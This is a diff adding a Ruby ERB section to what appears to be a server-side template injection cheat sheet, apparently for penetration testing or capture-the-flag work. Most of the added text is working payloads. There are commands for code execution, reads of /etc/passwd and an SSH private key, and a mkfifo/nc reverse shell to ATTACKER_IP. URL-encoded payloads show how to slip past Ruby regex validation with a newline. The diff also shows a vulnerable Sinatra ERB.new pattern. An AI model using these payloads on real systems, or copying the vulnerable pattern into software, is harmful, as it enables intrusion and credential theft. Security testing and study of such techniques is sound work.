@@ -173,11 +173,98 @@ def template(first, last, sender, ts, dob, gender):
 
 ### ERB (Ruby)
 
+[TrustedSec - Ruby ERB Template Injection](https://trustedsec.com/blog/rubyerb-template-injection) | [PayloadsAllTheThings - Ruby SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md)
+
+**Template syntax:** `<%= expression %>` — evaluates Ruby and outputs the result.
+
+#### RCE
+
 ```erb
 <%= system('id') %>
 <%= `id` %>
 <%= IO.popen('id').readlines() %>
+<%= `whoami` %>
+<%= `ls /` %>
 ```
+
+#### File Read
+
+```erb
+<%= File.open('/etc/passwd').read %>
+<%= File.open('/home/user/.ssh/id_rsa').read %>
+```
+
+If the file does not exist, `File.open` raises an exception — the app may return a 500 / Internal Server Error. Use this to confirm whether files exist.
+
+#### Introspection
+
+Enumerate available methods and instance variables to understand the app context:
+
+```erb
+<%= self.methods %>
+<%= self.instance_variables %>
+```
+
+#### Reverse Shell via ERB
+
+Wrap the command in backticks inside ERB tags:
+
+```erb
+<%= `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f` %>
+```
+
+#### Bypassing Input Validation with Newline Injection
+
+When a Ruby/Sinatra app validates input with a regex like `=~ /^[a-zA-Z0-9\/ ]+$/`, the `^` and `$` anchors match **per-line**, not the entire string. Injecting a URL-encoded newline (`%0A`) before the SSTI payload puts the malicious content on a new line that passes validation.
+
+**Vulnerable regex pattern (Ruby `=~` with `^$`):**
+
+```ruby
+params[:category] =~ /^[a-zA-Z0-9\/ ]+$/
+```
+
+Ruby's `^` matches start of any line and `$` matches end of any line. Compare with `\A` (start of string) and `\z` (end of string) which would block this bypass.
+
+**Bypass — URL-encode `\n` + SSTI payload after valid input:**
+
+```
+category1=history%0A%3C%25%3D%207%20%2A%207%20%25%3E
+```
+
+Decoded, the server sees:
+
+```
+history
+<%= 7 * 7 %>
+```
+
+The regex matches `history` on line 1 and `<%= 7 * 7 %>` never hits the check because `=~` already matched the first line. The template engine then evaluates the entire string including the SSTI payload.
+
+**File read with newline bypass (URL-encoded):**
+
+```
+history%0A%3C%25%3D%20File.open%28%27%2Fetc%2Fpasswd%27%29.read%20%25%3E
+```
+
+**RCE with newline bypass (URL-encoded):**
+
+```
+history%0A%3C%25%3D%20%60whoami%60%20%25%3E
+```
+
+Use [urlencoder.org](https://www.urlencoder.org/) to encode payloads when Burp's encoder is not available.
+
+**Reference:** [Bypassing Regular Expression Checks](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/) — covers why `^$` differs from `\A\z` in Ruby.
+
+#### Vulnerable Code Pattern (Sinatra + ERB.new)
+
+The root cause is user input concatenated directly into an `ERB.new()` template string:
+
+```ruby
+@result = ERB.new("Your total grade is <%= ... %><p>" + params[:category1] + ": <%= ... %></p>").result(binding)
+```
+
+When `params[:category1]` contains ERB tags (after bypassing the regex), the template engine evaluates them. Look for this pattern in Ruby/Sinatra apps where `ERB.new` takes a string built with user input.
 
 ### Freemarker (Java)
 
